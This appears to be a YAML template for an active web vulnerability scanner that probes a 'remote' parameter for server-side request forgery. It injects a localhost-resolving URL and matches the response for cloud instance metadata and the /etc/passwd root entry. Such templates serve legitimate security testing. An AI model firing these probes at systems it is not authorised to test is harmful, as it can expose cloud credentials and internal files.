id: ssrf5-0271
name: 'SSRF probe in remote'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via remote (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      remote:
        - 'http://0.nip.io/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
